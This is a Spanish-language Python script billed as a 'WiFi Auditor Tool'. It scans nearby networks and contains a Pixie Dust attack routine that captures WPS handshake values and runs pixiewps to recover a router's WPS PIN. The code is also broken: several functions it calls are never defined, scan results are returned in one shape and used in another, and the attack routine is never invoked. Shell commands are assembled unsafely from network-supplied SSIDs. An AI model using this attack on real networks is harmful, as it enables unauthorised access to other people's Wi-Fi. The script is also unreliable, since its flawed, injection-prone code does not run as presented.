import os
import subprocess
import re
import time
from tabulate import tabulate

def run_command(command, use_sudo=False):
    """Ejecuta un comando en la terminal y devuelve la salida."""
    if use_sudo:
        command = f"su -c '{command}'"
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = process.communicate()
    return stdout.strip(), stderr.strip()

def is_valid_bssid(bssid):
    """Verifica si un BSSID tiene un formato válido."""
    return re.match(r"([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}", bssid) is not None

def freq_to_channel(freq):
    """Convierte una frecuencia en MHz al canal correspondiente."""
    freq = int(freq)
    if 2412 <= freq <= 2472:
        return (freq - 2407) // 5
    elif freq == 2484:
        return 14
    elif 5180 <= freq <= 5825:
        return (freq - 5000) // 5
    return freq

def scan_wifi(interface):
    """Escanear redes Wi-Fi cercanas utilizando la interfaz especificada."""
    print(f"Escaneando redes Wi-Fi en la interfaz {interface}...")
    resultado, _ = run_command(f"iw dev {interface} scan", use_sudo=True)
    redes = []
    bssids = []
    canales = []
    intensidades = []
    for linea in resultado.split('\n'):
        if "SSID" in linea:
            essid = linea.split(':', 1)[1].strip()
            redes.append(essid)
        if "BSS" in linea:
            bssid = linea.split()[1].split('(')[0]
            if is_valid_bssid(bssid):
                bssids.append(bssid)
        if "freq:" in linea:
            freq = linea.split(':', 1)[1].strip()
            canal = freq_to_channel(freq)
            canales.append(canal)
        if "signal:" in linea:
            intensidad = linea.split(':', 1)[1].strip()
            intensidades.append(intensidad)
    return redes, bssids, canales, intensidades

def perform_pixie_dust_attack(interface, ssid):
    """Realiza el ataque Pixie Dust usando los datos de wpa_supplicant."""
    print(f"\nIniciando ataque Pixie Dust en SSID: {ssid}")

    # Capturar los datos necesarios usando wpa_supplicant
    pke, pkr, ehash1, ehash2, authkey, enonce = capture_wps_data(interface, ssid)
    if not all([pke, pkr, ehash1, ehash2, authkey, enonce]):
        print("No se pudieron capturar los datos necesarios para el ataque Pixie Dust.")
        return

    # Mostrar las claves capturadas
    print("\n--- Claves capturadas ---")
    print(f"PKE: {pke}")
    print(f"PKR: {pkr}")
    print(f"E-Hash1: {ehash1}")
    print(f"E-Hash2: {ehash2}")
    print(f"AuthKey: {authkey}")
    print(f"E-Nonce: {enonce}")
    print("-------------------------")

    # Ejecutar pixiewps con los valores capturados
    pixiewps_command = f"pixiewps -e {pke} -r {pkr} -s {ehash1} -z {ehash2} -a {authkey} -n {enonce} -vv"
    print(f"Ejecutando pixiewps: {pixiewps_command}")
    process = subprocess.Popen(pixiewps_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    for line in process.stdout:
        print(line.strip())  # Mostrar la salida de pixiewps en tiempo real
    
    pixie_stdout, pixie_stderr = process.communicate()

    print("\n--- Salida de pixiewps ---")
    print(pixie_stdout)
    print(pixie_stderr)

    if "WPS pin:" in pixie_stdout:
        pin = extract_value(pixie_stdout, "WPS pin:")
        print(f"\n¡Ataque exitoso! PIN encontrado: {pin}")
        return pin
    else:
        print("\nPixie Dust no pudo encontrar el PIN.")
        return None

def run_wpa_supplicant(interface, ssid):
    """Ejecuta wpa_supplicant para intentar asociarse con la red."""
    conf_path = create_wpa_supplicant_conf(ssid)
    command = f"wpa_supplicant -i {interface} -c {conf_path} -dd"
    print("\n[+] Ejecutando wpa_supplicant...")
    stdout, _ = run_command(command, use_sudo=True)
    os.remove(conf_path)
    return stdout

def display_menu():
    """Despliega el menú principal con estilo."""
    os.system("clear")
    print("=" * 50)
    print("               WiFi Auditor Tool v1.0")
    print("=" * 50)
    print("Desarrollador: Edinson2001")
    print("GitHub: Próximamente")
    print("-" * 50)

def main():
    """Función principal."""
    display_menu()
    interface = "wlan1"  # Cambia la interfaz según sea necesario.
    
    # Escanear redes
    networks = scan_wifi(interface)
    if not networks:
        print("\n[-] No se encontraron redes.")
        return

    # Mostrar redes en una tabla
    headers = ["#", "SSID", "BSSID", "Canal", "Intensidad"]
    table = [
        [
            i + 1,
            n.get("SSID", "<SSID oculto>"),  # Manejo de SSID oculto
            n["BSSID"],
            n.get("Channel", "N/A"),
            n.get("Signal", "N/A"),
        ]
        for i, n in enumerate(networks)
    ]
    print("\n[+] Redes disponibles:")
    print(tabulate(table, headers, tablefmt="fancy_grid"))

    # Selección de red
    try:
        choice = int(input("\nSelecciona una red (número): ")) - 1
        if choice < 0 or choice >= len(networks):
            print("\n[-] Selección inválida.")
            return
    except ValueError:
        print("\n[-] Entrada inválida.")
        return
    
    selected_network = networks[choice]
    print(f"\n[+] Red seleccionada: {selected_network.get('SSID', '<SSID oculto>')} ({selected_network['BSSID']})")
    
    # Intentar asociarse usando wpa_supplicant
    output = run_wpa_supplicant(interface, selected_network.get("SSID", ""))
    print("\n[+] Salida de wpa_supplicant:")
    print(output)

if __name__ == "__main__":
    main()
